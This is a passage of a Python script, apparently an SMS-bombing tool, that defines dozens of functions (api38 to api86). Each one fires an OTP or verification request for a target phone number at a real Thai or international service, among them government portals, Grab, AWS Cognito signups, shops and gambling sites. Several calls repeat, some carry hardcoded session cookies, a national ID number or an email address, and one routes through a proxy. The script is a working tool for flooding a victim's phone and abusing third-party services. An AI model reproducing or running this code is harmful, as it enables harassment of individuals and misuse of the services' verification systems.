	    "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
	    "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
	    }
	requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"}).text
	
def api38():
	requests.post("https://tdhw.treasury.go.th/TD-Vote/api/otp/request",json={"ID_CARD":"1104200197909","TEL":f"{phone}","OTP_TYPE":"OTP_TEST"})
	
def api39():
	requests.post("https://user-api.learn.co.th/authentication/sendOTP",json={"mobileNumber": f"{phone}"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Host": "user-api.learn.co.th","content-length": "29","sec-ch-ua-mobile": "?1","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","sec-ch-ua-platform": "Android","origin": "https://user.learn.co.th","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://user.learn.co.th/","x-api-key": "USER_API_KEY"})
	
def api40():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	
def api41():
	requests.get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")
	
def api42():
	requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api43():
	requests.get(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	
def api44():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "visid_incap_2104120=FpehtdvzRDuqWIUnbb2obcmSJ2IAAAAAQUIPAAAAAABOfPmHrdd2l1h5JKcTW+MB;tids=bsdi3vf25ea3jinbn8f4r596jpdeqeer;_ga_id=1558776998.1646760667;_gcl_au=1.1.1142664624.1646763274;_ga=GA1.2.1363432684.1646763274;_gid=GA1.2.2042579673.1646763275;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B14BC6DC.1;_ctout26068=1;verify=test;_fbp=fb.1.1646763276347.768942143;OptanonAlertBoxClosed=2022-03-08T18:14:39.934Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Mar+09+2022+01%3A14%3A39+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1;_ga_R05PJC3ZG8=GS1.1.1646763273.1.1.1646763285.48"})
	
def api45():
	requests.get("https://findclone.ru/register?phone=+66"+phone)
	
def api46():
	requests.post("https://kaspy.com/sms/sms.php/",data=f"phone={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"})
	
def api47():
	requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})
    
def api48():
	requests.post("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",data=f"method=wpRegisterotp&otp_tel={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "PHPSESSID=vtacuje1no166kkp4d40nolak5"})
	
def api49():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	
def api50():
	requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})
	
def api51():	
	requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
    
def api52():
	requests.post("https://api.myfave.com/api/fave/v3/auth", headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone": "66" + phone})
	
def api53():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone, "language": "th"},headers={"accept": "application/json, text/plain, /", "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
	
def api54():
	head = {
		"accept": "application/json, text/plain, */*",
		"content-type": "application/json",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
		"referer": "https://www.fox888.com/"
		 }
	requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",headers=head,json={"applicant":"0"+phone,"serviceName":"fox888.com"})
		
def api55():
	head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
def api56():
	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
	
def api57():
	requests.post("https://api.jokerslotzz.com/public/request-otp",headers={
    "Host": "api.jokerslotzz.com",
"content-length": "25",
"accept": "application/json, text/plain, */*",
"content-type": "application/json;charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://member.jokerslotzz.com","referer": "https://member.jokerslotzz.com/"
    },json={"username":f"{phone}"})
	
def api58():
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"

    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})

def api59():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")

def api60():
	post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def api61():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})

def api62():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone,"user_id":"EMP02","full_name":"Tried Threa"})

def api63():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
    
def api64():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})

def api65():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def api66():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")

def api67():
	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
     
def api68():
	requests.post("https://gettgo.com/sessions/otp_for_sign_up",data={"mobile_number": phone})

def api69():
	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
  
def api70():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
    
def api71():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})

def api72():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def api73():
	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
        "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})

def api74():
	requests.post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    
def api75():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone,"user_id":"EMP02","full_name":"Tried Threa"})
	
def api76():
	headers = {
	    "content-type": "application/x-www-form-urlencoded",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
	    "cookie": "_gcl_au=1.1.1123274548.1637746846"
	    }
	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
		
def api77():
	requests.post(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	
def api78():
	requests.post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})


def api79():
	requests.post("https://ufa3bb.com/account/register/sendotp", data=f"phone={phone}",headers={
	"x-requested-with": "XMLHttpRequest",
	"accept": "application/json, text/javascript, /; q=0.01",
	"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	"referer": "https://ufa3bb.com/account/register",
	"cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"})
    
def api80():
	requests.post("https://bkgame.bet/env/authen.php?requestotp", data=f"phone_number={phone}",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

def api81():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})

def api82():
	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number": phone})

def api83():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})

def api84():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})

def api85():
	requests.post(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")

def api86():
	head = {
	    "x-requested-with": "XMLHttpRequest",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "accept": "*/*",
	    "referer": "https://www.pruksa.com/member/register/otp_code",
